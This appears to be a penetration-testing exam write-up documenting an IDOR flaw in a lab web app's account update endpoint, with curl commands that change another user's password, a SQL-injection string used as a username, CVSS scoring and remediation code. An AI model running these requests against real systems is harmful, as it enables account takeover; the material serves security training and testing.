# FailSafe PWPA Exam - Phase 2: Account Page Testing

**Date:** January 18, 2026
**Target:** http://10.0.0.10/account

---

## IDOR Vulnerability Testing - Account Update

### Vulnerability: Insecure Direct Object Reference (IDOR) - 25 points

**Description:**  
The account update endpoint (`POST /account/update`) fails to properly validate that the authenticated user can only modify their own account. An attacker can modify the `user_id` parameter to update any other user's account password without authorization.

**Impact:**  
Attackers can change other users' passwords, leading to complete account takeover. Combined with SQL injection, this allows unauthorized access to any user account in the system.

**Technical Details:**

**Vulnerable Endpoint:** POST /account/update
**Parameter:** `user_id` (in JSON body)
**Vulnerability Type:** Broken Access Control / IDOR

---

## Step-by-Step Recreation

### Prerequisites:
- Two user accounts (attacker account and target account)
- Valid session cookie for attacker account
- Access to Burp Suite or curl

### Accounts Used:
- **Attacker Account:** testuser1 / Password123!
- **Target Account:** test' OR '1'='1 / Password123! (SQL-injected account)

### Step 1: Login as Attacker (testuser1)

```bash
curl -X POST http://10.0.0.10/login \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser1","password":"Password123!"}'
```

**Response:**
```http
HTTP/1.1 200 OK
Set-Cookie: connect.sid=s%3Ae3Eb2t-3HGOrpeXqxjmYmGprfLarVIXR.I0pzkyMIRP7STivrqi3tQqcxH1pQlOEoVCfg9q%2B7q88; Path=/; HttpOnly

{"message":"Login successful.","success":true}
```

**Copy the cookie:** `connect.sid=s%3Ae3Eb2t-3HGOrpeXqxjmYmGprfLarVIXR.I0pzkyMIRP7STivrqi3tQqcxH1pQlOEoVCfg9q%2B7q88`

### Step 2: Test Updating Own Account (Control)

```bash
curl -X POST http://10.0.0.10/account/update \
  -H "Cookie: connect.sid=s%3Ae3Eb2t-3HGOrpeXqxjmYmGprfLarVIXR.I0pzkyMIRP7STivrqi3tQqcxH1pQlOEoVCfg9q%2B7q88" \
  -H "Content-Type: application/json" \
  -d '{"password":"Password123!","updatedPassword":"newpass123","updateField":"account","user_id":"1"}'
```

**Expected Response:**
```json
{"success":true,"message":"Account password updated successfully!"}
```

### Step 3: Test IDOR - Update Another User's Account (user_id=2)

```bash
curl -X POST http://10.0.0.10/account/update \
  -H "Cookie: connect.sid=s%3Ae3Eb2t-3HGOrpeXqxjmYmGprfLarVIXR.I0pzkyMIRP7STivrqi3tQqcxH1pQlOEoVCfg9q%2B7q88" \
  -H "Content-Type: application/json" \
  -d '{"password":"Password123!","updatedPassword":"hacked123","updateField":"account","user_id":"2"}'
```

**Vulnerable Response (IDOR Confirmed):**
```json
{"success":true,"message":"Account password updated successfully!"}
```

**Analysis:** The application accepts the request and updates User 2's password without verifying authorization. The attacker (User 1) successfully modified another user's account.

### Step 4: Verify IDOR Impact

Attempt to login as the target user with the new password:

```bash
curl -X POST http://10.0.0.10/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test' OR '1'='1","password":"hacked123"}'
```

**If successful:** Login succeeds with the new password, confirming account takeover.

---

## CVSS v3.1 Score

**CVSS v3.1 Score:** 8.8 (High)  
**Vector:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H  
**Rationale:** Network attack, low complexity, low privileges required (authenticated user), no user interaction, unchanged scope, high confidentiality/integrity/availability impact.

**Likelihood / Exploitability:**
- **Exploitability:** Easy - simple parameter modification
- **Required Access Level:** Low (authenticated user)
- **Technical Skill Required:** Low
- **Available Tools:** curl, Burp Suite

---

## Remediation

1. **Implement proper authorization checks:**
   ```javascript
   // Vulnerable code
   app.post('/account/update', (req, res) => {
     const { user_id, password, updatedPassword } = req.body;
     db.query("UPDATE users SET password = ? WHERE id = ?", [updatedPassword, user_id]);
   });

   // Secure code
   app.post('/account/update', (req, res) => {
     const { user_id, password, updatedPassword } = req.body;
     const authenticatedUserId = req.session.userId;
     
     // Verify user can only update their own account
     if (user_id !== authenticatedUserId) {
       return res.status(403).json({ success: false, message: "Unauthorized" });
     }
     
     db.query("UPDATE users SET password = ? WHERE id = ?", [updatedPassword, user_id]);
   });
   ```

2. **Remove user-controlled ID parameters** - Use session user ID instead
3. **Implement role-based access control (RBAC)**
4. **Add audit logging** for account modifications
5. **Implement rate limiting** on sensitive operations

---

## Status

**Status:** Confirmed  
**Severity:** High  
**Points:** 25 (IDOR/Broken Access Control)

---

[Screenshots to be added here]
- Screenshot of successful IDOR request in Burp Repeater
- Screenshot showing password update for another user
- Screenshot of login with new password (account takeover confirmation)